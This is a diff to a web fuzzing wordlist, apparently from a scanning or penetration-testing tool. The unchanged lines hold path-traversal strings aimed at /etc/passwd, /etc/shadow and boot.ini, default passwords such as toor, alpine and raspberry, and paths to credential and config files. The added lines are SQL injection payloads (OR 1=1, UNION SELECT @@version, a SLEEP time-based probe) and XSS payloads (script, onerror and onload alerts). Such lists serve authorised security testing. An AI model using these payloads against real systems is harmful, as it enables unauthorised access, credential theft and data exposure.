@@ -1,3 +1,4 @@
+/.../.../.../.../.../
 \…..\\\…..\\\…..\\\
 0
 00
@@ -78,17 +79,19 @@
 ..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd
 ..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow
 =3D “/..” . “%2f..
+404: Not Found
+404: Not Found/.../.../.../.../.../
 404: Not Found404: Not Found
-404: Not Found404: Not Found404: Not Found404: Not Found404: Not Found404: Not Found404: Not Found/.../.../.../.../.../
-404: Not Found404: Not Found404: Not Found404: Not Found404: Not Found.bash_history
-404: Not Found404: Not Found404: Not Foundroot
 ..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini
 admin
+admin' #
+admin' --
 admin/access_log
 /admin/install.php
 administrator
 ../../../administrator/inbox
 alpine
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
 /apache2/logs/access.log
 /apache2/logs/access_log
 /apache2/logs/error.log
@@ -110,12 +113,14 @@ alpine
 /apache\php\php.ini
 \\&apos;/bin/cat%20/etc/passwd\\&apos;
 \\&apos;/bin/cat%20/etc/shadow\\&apos;
+.bash_history
 /.bash_history
 /.bash_profile
 .bashrc
 /.bashrc
 /../../../../../../../../bin/id|
 /bin/php.ini
+<body onload=alert(1)>
 /boot/grub/grub.conf
 ../../../../../../../../../../../../boot.ini
 ../../boot.ini
@@ -177,11 +182,13 @@ database.php
 data.php
 dbase.php a
 db.php
+<details open ontoggle=alert(1)>
 ../../../../../../../dev
 dietpi
 /D:\Program Files\
 d:\System32\Inetsrv\metabase.xml
 .env
+EOF
 /etc/apache2/apache2.conf
 /etc/apache2/conf/httpd.conf
 /etc/apache2/.htpasswd
@@ -231,6 +238,10 @@ d:\System32\Inetsrv\metabase.xml
 .hta
 .htaccess
 .htpasswd
+<iframe src="javascript:alert(1)">
+<img src=x onerror=alert(1)>
+<input autofocus onfocus=alert(1)>
+javascript:alert(1)
 letmein
 .listing
 .listings
@@ -238,6 +249,15 @@ logon
 maintenance
 marketing
 .mysql_history
+") OR 1=1--
+' OR '1'='1
+' OR '1'='1' /*
+' OR 1=1#
+' OR 1=1--
+' OR 1=1/*
+') OR '1'='1
+') OR ('1'='1
+' OR 1=1 LIMIT 1--
 .passwd
 password
 Passw@rd
@@ -246,9 +266,13 @@ Passw@rd
 qwerty
 raspberry
 .rhosts
+root
+'"><script>alert(1)</script>
+<script>alert(1)</script>
 .sh_history
 .ssh
 .subversion
+<svg/onload=alert(1)>
 .svn
 .svn/entries
 .svnignore
@@ -256,7 +280,10 @@ raspberry
 techsupport
 test
 toor
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT @@version,NULL,NULL--
 uploader
+<video><source onerror=alert(1)>
 .web
 webadmin
 ../web.config
